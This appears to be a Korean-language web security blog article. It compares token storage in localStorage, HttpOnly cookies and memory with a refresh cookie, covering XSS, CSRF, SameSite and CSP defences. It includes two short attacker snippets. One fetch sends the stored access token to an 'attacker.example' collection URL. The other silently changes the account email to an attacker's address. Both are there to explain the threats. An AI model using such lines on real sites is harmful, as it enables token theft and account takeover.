
로그인 API가 액세스 토큰을 돌려줍니다.
이제 이걸 어딘가에 저장해서 다음 요청마다 보내야 합니다.

검색해 보면 의견이 갈립니다.
"localStorage는 XSS에 털리니까 절대 쓰지 마라."
"HttpOnly 쿠키가 정답이다."
"쿠키는 CSRF 때문에 위험하다, 헤더로 보내라."

각자 맞는 이야기를 하고 있지만, 무엇을 막고 무엇을 못 막는지를 같이 말하지 않아서 헷갈립니다.
정답 하나를 고르기보다 각 선택의 트레이드오프를 정확히 짚어 보겠습니다.

## 두 공격부터 정리하기

토큰 저장 위치 논쟁은 두 가지 공격을 두고 벌어집니다.

**XSS(Cross-Site Scripting)** 는 공격자의 스크립트가 **우리 사이트 안에서** 실행되는 것입니다.
댓글에 넣은 스크립트가 그대로 렌더링되거나, 오염된 npm 패키지가 번들에 들어오거나, 서드파티 스크립트가 탈취되는 경우입니다.
일단 실행되면 그 스크립트는 우리 코드와 같은 권한으로 움직입니다.

**CSRF(Cross-Site Request Forgery)** 는 **다른 사이트가** 사용자의 브라우저를 이용해 우리 서버로 요청을 보내게 만드는 것입니다.
브라우저가 그 요청에 우리 사이트의 쿠키를 자동으로 붙이기 때문에 가능한 공격입니다.
공격자는 응답을 읽지 못하지만, 송금이나 비밀번호 변경처럼 요청이 처리되기만 하면 되는 경우에는 충분합니다.

저장 위치에 따라 두 공격에 노출되는 정도가 다릅니다.

## localStorage에 저장하면

```js
localStorage.setItem('accessToken', token);

fetch('/api/me', {
  headers: { Authorization: `Bearer ${localStorage.getItem('accessToken')}` },
});
```

구현이 가장 간단하고, 새로고침해도 로그인이 유지됩니다.

**CSRF에는 강합니다.**
브라우저가 localStorage 값을 요청에 자동으로 붙이지 않기 때문입니다.
다른 사이트에서 보낸 요청에는 `Authorization` 헤더가 없으니 인증되지 않습니다.

**XSS에는 약합니다.**
같은 출처에서 실행되는 스크립트는 누구나 localStorage를 읽을 수 있습니다.

```js
// 공격자 스크립트
fetch('https://attacker.example/collect?t=' + localStorage.getItem('accessToken'));
```

이 한 줄로 토큰이 밖으로 나갑니다.
공격자는 그 토큰으로 **자기 컴퓨터에서, 사용자가 브라우저를 닫은 뒤에도, 토큰이 만료될 때까지** API를 호출할 수 있습니다.
이게 localStorage를 꺼리는 핵심 이유입니다.
sessionStorage도 탭을 닫으면 사라진다는 점 외에는 같습니다.

## HttpOnly 쿠키에 저장하면

서버가 로그인 응답에서 쿠키를 설정합니다.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

- `HttpOnly`: 자바스크립트의 `document.cookie`로 읽을 수 없습니다.
- `Secure`: HTTPS 연결에서만 전송됩니다. (`localhost`는 브라우저가 예외로 취급하는 경우가 많습니다.)
- `SameSite`: 다른 사이트에서 시작된 요청에 쿠키를 붙일지 정합니다. 아래에서 자세히 봅니다.

**XSS로 토큰을 훔쳐 가기는 어려워집니다.**
스크립트가 쿠키 값을 읽을 수 없으니 밖으로 빼낼 수 없습니다.

**하지만 XSS를 막아 주는 것은 아닙니다.**
이 부분을 자주 놓칩니다.
공격자 스크립트는 토큰을 몰라도 이렇게 할 수 있습니다.

```js
// 공격자 스크립트: 같은 출처이니 쿠키가 자동으로 붙는다
fetch('/api/account/email', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'attacker@example.com' }),
});
```

같은 출처의 요청이니 브라우저는 쿠키를 붙이고, 서버는 정상 요청으로 처리합니다.
응답도 읽을 수 있습니다.
차이는 **공격이 사용자가 그 페이지를 열어 둔 동안에만 가능하다**는 점입니다.
토큰을 훔쳐 가는 것보다는 피해가 제한되지만, 이메일을 바꾸고 비밀번호를 재설정하는 데는 그 시간이면 충분할 수 있습니다.

**대신 CSRF를 고민해야 합니다.**
쿠키는 브라우저가 자동으로 붙이기 때문입니다.

## SameSite가 CSRF를 얼마나 막아 주나

`SameSite`는 다른 사이트에서 시작된 요청에 쿠키를 보낼지 정합니다.

- `Strict`: 다른 사이트에서 시작된 요청에는 절대 보내지 않습니다. 다른 사이트의 링크를 눌러 들어와도 첫 요청에는 쿠키가 없어서, 로그인이 안 된 것처럼 보입니다.
- `Lax`: 다른 사이트에서 링크를 눌러 이동하는 것처럼 **최상위 내비게이션 + 안전한 메서드(GET 등)** 에만 보냅니다. 다른 사이트의 폼 POST, iframe, `fetch`에는 보내지 않습니다.
- `None`: 항상 보냅니다. `Secure`가 함께 있어야 합니다.

`Lax`만으로도 앞의 "숨겨진 폼 POST" 같은 고전적인 CSRF는 막힙니다.
Chrome 계열은 `SameSite`를 지정하지 않은 쿠키를 `Lax`로 취급하지만, 모든 브라우저가 그렇지는 않으니 항상 명시하는 편이 좋습니다.

다만 `SameSite`만 믿기 어려운 이유가 있습니다.

- **"사이트"는 "출처"보다 넓습니다.** `SameSite`에서 같은 사이트란 스킴과 등록 가능한 도메인(예: `example.com`)이 같은 것입니다. `blog.example.com`과 `app.example.com`은 출처는 다르지만 같은 사이트라서, 하위 도메인 하나가 뚫리면 `SameSite`가 막아 주지 못합니다.
- **GET으로 상태를 바꾸는 API가 있으면** `Lax`에서도 링크 한 번으로 공격이 됩니다. 상태를 바꾸는 요청은 GET으로 만들지 않아야 합니다.
- 다른 도메인의 프론트엔드가 쿠키를 써야 하는 구조라면 `None`이 필요하고, 그러면 보호가 사라집니다.

그래서 쿠키 기반 인증에서는 `SameSite`에 더해 CSRF 토큰을 쓰거나, 서버에서 `Origin` 헤더를 검증하는 방법을 함께 씁니다.
`X-Requested-With` 같은 커스텀 헤더를 요구하는 것도 방법입니다. 다른 출처에서 커스텀 헤더를 붙이면 CORS 프리플라이트가 일어나고, 서버가 허락하지 않으면 본 요청이 나가지 않기 때문입니다.

쿠키 이름에 `__Host-` 접두사를 붙이면 `Secure`, `Path=/`, `Domain` 없음 조건을 브라우저가 강제합니다.
하위 도메인에서 같은 이름의 쿠키를 심어 덮어쓰는 공격을 막는 데 도움이 됩니다.

## 메모리 + 리프레시 토큰 쿠키

SPA에서 많이 쓰이는 절충안이 있습니다.

- **액세스 토큰**: 수명을 짧게(예: 몇 분) 하고, 자바스크립트 변수(메모리)에만 둡니다. 요청할 때 `Authorization` 헤더로 보냅니다.
- **리프레시 토큰**: `HttpOnly; Secure; SameSite=Strict` 쿠키에 두고, 경로를 갱신 엔드포인트로 좁힙니다(`Path=/auth/refresh`).
- 페이지를 새로고침하면 메모리가 비니, 앱 시작 시 갱신 엔드포인트를 불러 새 액세스 토큰을 받습니다.

```js
let accessToken = null;

async function refresh() {
  const res = await fetch('/auth/refresh', { method: 'POST', credentials: 'include' });
  if (!res.ok) throw new Error('로그인이 필요합니다');
  ({ accessToken } = await res.json());
}

async function api(path, init = {}) {
  if (!accessToken) await refresh();
  const call = () =>
    fetch(path, { ...init, headers: { ...init.headers, Authorization: `Bearer ${accessToken}` } });
  let res = await call();
  if (res.status === 401) {
    await refresh();
    res = await call();
  }
  return res;
}
```

실제로 쓸 때는 여러 요청이 동시에 401을 받았을 때 갱신을 한 번만 하도록 진행 중인 `refresh()` Promise를 공유해야 합니다. 위 코드는 흐름만 보여 줍니다.

이 구조가 주는 것을 정확히 보면 이렇습니다.

- 액세스 토큰이 localStorage에 없으니 디스크에 남지 않고, 다른 탭의 스크립트나 확장 프로그램이 저장소를 뒤져 찾을 수 없습니다.
- 리프레시 토큰은 `HttpOnly`라 읽을 수 없고, 갱신 경로로만 전송되니 다른 API 요청에 붙어 다니지 않습니다.
- 일반 API는 헤더로 인증하므로 CSRF 대상이 아닙니다. 갱신 엔드포인트만 CSRF를 신경 쓰면 되고, 이건 `SameSite=Strict`와 `Origin` 검증으로 좁게 막을 수 있습니다.

그러나 이것도 XSS를 막지는 못합니다.
공격자 스크립트가 같은 페이지에서 `/auth/refresh`를 부르면 쿠키가 붙고, 응답 본문으로 새 액세스 토큰을 받습니다.
메모리 변수도 앱 코드의 함수를 가로채면 접근할 수 있습니다.
이 방식이 줄여 주는 건 **탈취된 토큰의 수명과 노출 범위**입니다.
리프레시 토큰 회전(갱신할 때마다 새 리프레시 토큰을 발급하고 이전 것을 폐기)과 재사용 감지를 함께 쓰면 이 범위가 더 줄어듭니다.

브라우저에 토큰을 아예 두지 않는 BFF(Backend for Frontend) 패턴도 있습니다.
같은 도메인의 서버가 토큰을 보관하고 브라우저와는 세션 쿠키로만 통신하는 방식으로, OAuth 관련 문서에서 브라우저 앱에 가장 안전한 구조로 소개됩니다.
대신 서버를 하나 더 운영해야 합니다.

## 어디에 저장하든 XSS가 있으면 진다

여기까지 오면 공통점이 보입니다.
localStorage든, HttpOnly 쿠키든, 메모리든, **우리 페이지에서 공격자 스크립트가 실행되면** 공격자는 사용자로서 요청을 보낼 수 있습니다.
저장 위치가 바꾸는 건 피해의 모양(토큰을 들고 나가느냐, 페이지 안에서만 행동하느냐)과 지속 시간입니다.

| 저장 위치 | XSS 시 | CSRF | 구현 부담 |
| --- | --- | --- | --- |
| localStorage | 토큰이 밖으로 유출됨 | 해당 없음 | 낮음 |
| HttpOnly 쿠키 | 페이지가 열린 동안 사용자로 행동 가능 | 방어 필요 | 중간 |
| 메모리 + 리프레시 쿠키 | 페이지가 열린 동안 행동, 짧은 수명 토큰 노출 가능 | 갱신 경로만 방어 | 높음 |

그래서 저장 위치 논쟁보다 먼저 해야 할 것은 XSS 자체를 막는 일입니다.

- 사용자 입력을 HTML로 넣지 않습니다. React의 JSX는 기본적으로 이스케이프하지만 `dangerouslySetInnerHTML`, `innerHTML`, `href={userInput}`의 `javascript:` URL은 예외입니다. HTML을 꼭 넣어야 하면 DOMPurify 같은 검증된 라이브러리로 정제합니다.
- 서드파티 스크립트와 의존성을 줄이고, 고정된 버전을 씁니다.

### CSP로 피해 범위 줄이기

Content Security Policy는 XSS가 생기더라도 스크립트가 실행되지 못하게 막는 두 번째 방어선입니다.

```http
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

- 서버가 요청마다 무작위 nonce를 만들어 `<script nonce="r4nd0m">`처럼 우리 스크립트에만 붙입니다. nonce가 없는 인라인 스크립트, 주입된 `<script>`는 실행되지 않습니다.
- `'strict-dynamic'`은 nonce로 허락된 스크립트가 동적으로 불러오는 스크립트까지 신뢰를 이어 줍니다.
- `connect-src`로 `fetch` 대상 도메인을 제한하면 토큰을 외부로 보내는 요청 일부를 막을 수 있습니다. 이미지 요청이나 페이지 이동처럼 다른 유출 경로도 있으니 이것만으로 충분하지는 않습니다.

CSP는 처음부터 강하게 걸면 기존 코드가 깨지기 쉬우니, `Content-Security-Policy-Report-Only`로 위반만 보고받으면서 정책을 다듬은 뒤 적용합니다.

## 정리

- localStorage는 CSRF에 강하지만 XSS가 생기면 토큰이 밖으로 유출되어 페이지 밖에서도 계속 쓰입니다.
- HttpOnly 쿠키는 토큰 유출을 막지만, XSS 스크립트가 페이지 안에서 사용자로 행동하는 것까지 막지는 못하고, CSRF 방어(`SameSite`, CSRF 토큰, `Origin` 검증)가 필요합니다.
- `SameSite=Lax`는 대부분의 CSRF를 막지만 "사이트" 단위라서 하위 도메인 공격과 GET으로 상태를 바꾸는 API에는 약합니다. 항상 명시하고, `Secure`를 함께 씁니다.
- 메모리의 짧은 액세스 토큰 + `HttpOnly` 리프레시 쿠키는 탈취 피해의 수명과 범위를 줄이는 절충안입니다. XSS를 막아 주지는 않습니다.
- 어디에 저장하든 XSS가 있으면 공격자는 사용자로서 요청할 수 있습니다. 저장 위치보다 XSS 예방과 CSP가 먼저입니다.

## 참고

- [MDN - Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN - Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [web.dev - SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)
- [OWASP - Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP - Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
